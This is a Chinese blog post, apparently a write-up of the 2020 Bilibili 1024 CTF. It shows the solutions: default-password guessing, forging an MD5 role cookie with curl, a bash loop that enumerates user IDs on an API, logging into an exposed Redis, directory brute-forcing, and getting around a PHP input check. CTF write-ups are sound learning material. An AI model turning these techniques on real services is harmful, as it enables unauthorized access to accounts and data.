{"pageProps":{"title":"Bilibili 1024 节 CTF Write Up - 宝硕博客","post":{"title":"Bilibili 1024 节 CTF Write Up","excerpt":null,"content":"<p>比赛地址： <a href=\"https://security.bilibili.com/sec1024/\">https://security.bilibili.com/sec1024/</a></p>\n<h2 id=\"t1：页面的背后是什么？\"><a class=\"anchor\" href=\"#t1：页面的背后是什么？\"></a>T1：页面的背后是什么？</h2>\n<p><s>F12 解决一切问题</s></p>\n<p><img src=\"https://s1.baoshuo.ren/2020/11/28/XrLpIf2OHs4YAxJ.png\" alt=\"\" loading=\"lazy\"></p>\n<h2 id=\"t2：真正的秘密只有特殊的设备才能看到\"><a class=\"anchor\" href=\"#t2：真正的秘密只有特殊的设备才能看到\"></a>T2：真正的秘密只有特殊的设备才能看到</h2>\n<p>改下 UA 就行了，轻松到手</p>\n<p><img src=\"https://s1.baoshuo.ren/2020/11/28/WPLCUHNYiE2nFwJ.png\" alt=\"\" loading=\"lazy\"></p>\n<p><img src=\"https://s1.baoshuo.ren/2020/11/28/83GrjFbTwJf1BHn.png\" alt=\"\" loading=\"lazy\"></p>\n<h2 id=\"t3：密码是啥？\"><a class=\"anchor\" href=\"#t3：密码是啥？\"></a>T3：密码是啥？</h2>\n<p>看了看源码，没啥思路，最后随便试了试 <code>admin</code> <code>root</code> <code>bilibili</code> 什么的，竟然是对的。</p>\n<ul>\n<li>用户名 <code>admin</code></li>\n<li>密码 <code>bilibili</code></li>\n</ul>\n<p>另外，你告诉我什么是 <strong>falg</strong> ？</p>\n<p><img src=\"https://s1.baoshuo.ren/2020/11/28/eg9kBtR1aQizGYE.png\" alt=\"\" loading=\"lazy\"></p>\n<h2 id=\"t4：对不起，权限不足～\"><a class=\"anchor\" href=\"#t4：对不起，权限不足～\"></a>T4：对不起，权限不足～</h2>\n<p>第一次访问：</p>\n<p><img src=\"https://s1.baoshuo.ren/2020/11/28/roVjXTfs4v8ibP5.png\" alt=\"\" loading=\"lazy\"></p>\n<p>第二次访问：</p>\n<p><img src=\"https://s1.baoshuo.ren/2020/11/28/RpEsGn8c9KY16MH.png\" alt=\"\" loading=\"lazy\"></p>\n<p>查看源码可以发现有个 API 请求，查看请求数据得到以下信息。</p>\n<p><img src=\"https://s1.baoshuo.ren/2020/11/28/nhF7pCTQsVYxKdj.png\" alt=\"\" loading=\"lazy\"></p>\n<p>role 里面的东西，贴进谷歌一搜就知道它是 <code>user</code> 的 MD5 。</p>\n<p>和超级管理员相关的名字相信大家都知道，无非就是 <code>admin</code> <code>Administrator</code> <code>root</code> 之类的东西。</p>\n<p>挨个试，最后发现 <code>Administrator</code> 是正确的。</p>\n<pre><code class=\"hljs shell\">curl &quot;http://45.113.201.36/api/ctf/4&quot; --cookie &quot;role=7b7bc2512ee1fedcd76bdc68926d4f7b; session=***;&quot;</code></pre>\n<p><img src=\"https://s1.baoshuo.ren/2020/11/28/gEhkmTJrnaoMwPv.png\" alt=\"\" loading=\"lazy\"></p>\n<h2 id=\"t5：别人的秘密\"><a class=\"anchor\" href=\"#t5：别人的秘密\"></a>T5：别人的秘密</h2>\n<p><img src=\"https://s1.baoshuo.ren/2020/11/28/c4BjYs3nVuCpxmH.png\" alt=\"\" loading=\"lazy\"></p>\n<p>发现有个 API，还有个 UID。</p>\n<p>最开始没想到需要从代码里面的&quot;初始 UID&quot;开始扫，浪费了我好多时间。</p>\n<pre><code class=\"hljs shell\">for ((i=100336889;$i&lt;9999999999;i=($i+1))); do echo -e &quot;[$i] \\c&quot; &amp;&amp; curl &quot;http://45.113.201.36/api/ctf/5?uid=$&#123;i&#125;&quot; -H &#x27;User-Agent: bilibili Security Browser&#x27; -H &#x27;Cookie: session=*****; role=ee11cbb19052e40b07aac0ca060c23ee&#x27; ; done</code></pre>\n<p><img src=\"https://s1.baoshuo.ren/2020/11/28/m1Hr4u8FOJe7ycI.png\" alt=\"\" loading=\"lazy\"></p>\n<h2 id=\"t6-t10：结束亦是开始，接下来的旅程，需要少年自己去探索啦～\"><a class=\"anchor\" href=\"#t6-t10：结束亦是开始，接下来的旅程，需要少年自己去探索啦～\"></a>T6~T10：结束亦是开始，接下来的旅程，需要少年自己去探索啦～</h2>\n<p>先扫了扫端口，发现有个 redis</p>\n<p><img src=\"https://s1.baoshuo.ren/2020/11/28/E29tLxSiC6Qzn5O.png\" alt=\"\" loading=\"lazy\"></p>\n<pre><code class=\"hljs shell\">redis-cli -h 120.92.151.189 -p 6379</code></pre>\n<p>登上去看看，发现了第八题的 flag 。</p>\n<p><img src=\"https://s1.baoshuo.ren/2020/11/28/Oo5vyeEsChmSt2H.png\" alt=\"\" loading=\"lazy\"></p>\n<p>然后爆破下目录</p>\n<p><img src=\"https://s1.baoshuo.ren/2020/11/28/QEnxZsg8FpiOKwm.png\" alt=\"\" loading=\"lazy\"></p>\n<p>有个 test.php ，访问下发现是个 JSfuck 加密，丢进浏览器里面解密下</p>\n<p><img src=\"https://s1.baoshuo.ren/2020/11/28/G7TWPndrhqBmvAI.png\" alt=\"\" loading=\"lazy\"></p>\n<p>程序员最多的地方，那就肯定是 Github 了。</p>\n<p>然后找到了一个仓库 <a href=\"https://github.com/interesting-1024/end\">interesting-1024/end</a></p>\n<p>有个 <code>end.php</code></p>\n<pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span>\n\n<span class=\"hljs-comment\">//filename end.php</span>\n\n<span class=\"hljs-variable\">$bilibili</span> = <span class=\"hljs-string\">&quot;bilibili1024havefun&quot;</span>;\n\n<span class=\"hljs-variable\">$str</span> = <span class=\"hljs-title function_ invoke__\">intval</span>(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;id&#x27;</span>]);\n<span class=\"hljs-variable\">$reg</span> = <span class=\"hljs-title function_ invoke__\">preg_match</span>(<span class=\"hljs-string\">&#x27;/\\d/is&#x27;</span>, <span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;id&#x27;</span>]);\n\n<span class=\"hljs-keyword\">if</span>(!<span class=\"hljs-title function_ invoke__\">is_numeric</span>(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;id&#x27;</span>]) <span class=\"hljs-keyword\">and</span> <span class=\"hljs-variable\">$reg</span> !== <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-variable\">$str</span> === <span class=\"hljs-number\">1</span>)&#123;\n    <span class=\"hljs-variable\">$content</span> = <span class=\"hljs-title function_ invoke__\">file_get_contents</span>(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;url&#x27;</span>]);\n\n    <span class=\"hljs-comment\">//文件路径猜解</span>\n    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-literal\">false</span>)&#123;\n        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">&quot;还差一点点啦～&quot;</span>;\n    &#125;<span class=\"hljs-keyword\">else</span>&#123;\n        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-variable\">$flag</span>;\n    &#125;\n&#125;<span class=\"hljs-keyword\">else</span>&#123;\n    <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">&quot;你想要的不在这儿～&quot;</span>;\n&#125;\n<span class=\"hljs-meta\">?&gt;</span></code></pre>\n<p>然后需要构造出一个 符合 <code>!is_numeric($_GET['id']) and preg_match('/\\d/is', $_GET['id']) !== 1 and intval($_GET['id']) === 1</code> 的请求即可。</p>\n<p><img src=\"https://s1.baoshuo.ren/2020/11/28/mCIevr1HSMBpkdi.png\" alt=\"\" loading=\"lazy\"></p>\n<p>可以得到一个图片的链接 <code>http://45.113.201.36/blog/imgs/bilibili_224a634752448def6c0ec064e49fe797_havefun.jpg</code></p>\n<p><img src=\"https://s1.baoshuo.ren/2020/11/28/iXEgYzjPtH2NhQw.png\" alt=\"\" loading=\"lazy\"></p>\n<p>这个图片的末尾就是第十个 flag 了（图中标蓝的地方）。</p>\n","thumb":"https://s1.baoshuo.ren/2020/12/01/cZoPxLHXlkFSjrt.jpg","date":"2020-10-26","updated":"2020-10-26","isoDate":"2020-10-26T10:02:08.000Z","isoUpdate":"2020-10-26T10:02:08.000Z","categories":[{"name":"技术向","url":"/categories/%E6%8A%80%E6%9C%AF%E5%90%91/"}],"tags":[{"name":"CTF","url":"/tags/CTF/"},{"name":"Bilibili","url":"/tags/Bilibili/"}],"license":null,"permalink":"https://blog.baoshuo.ren/post/bilibili-1024-ctf-write-up/","prev":{"title":"USTC Hackergame 2020 Write Up","url":"/post/ustc-hackergame-2020-write-up/"},"next":{"title":"使用树莓派+Nginx搭建 Rtmp 直播服务","url":"/post/raspberry-pi-rtmp-live/"},"toc":{"1":{"text":"T1：页面的背后是什么？","id":"t1：页面的背后是什么？"},"2":{"text":"T2：真正的秘密只有特殊的设备才能看到","id":"t2：真正的秘密只有特殊的设备才能看到"},"3":{"text":"T3：密码是啥？","id":"t3：密码是啥？"},"4":{"text":"T4：对不起，权限不足～","id":"t4：对不起，权限不足～"},"5":{"text":"T5：别人的秘密","id":"t5：别人的秘密"},"6":{"text":"T6~T10：结束亦是开始，接下来的旅程，需要少年自己去探索啦～","id":"t6-t10：结束亦是开始，接下来的旅程，需要少年自己去探索啦～"}},"hasToc":true,"comments":true},"__post":true},"__N_SSG":true}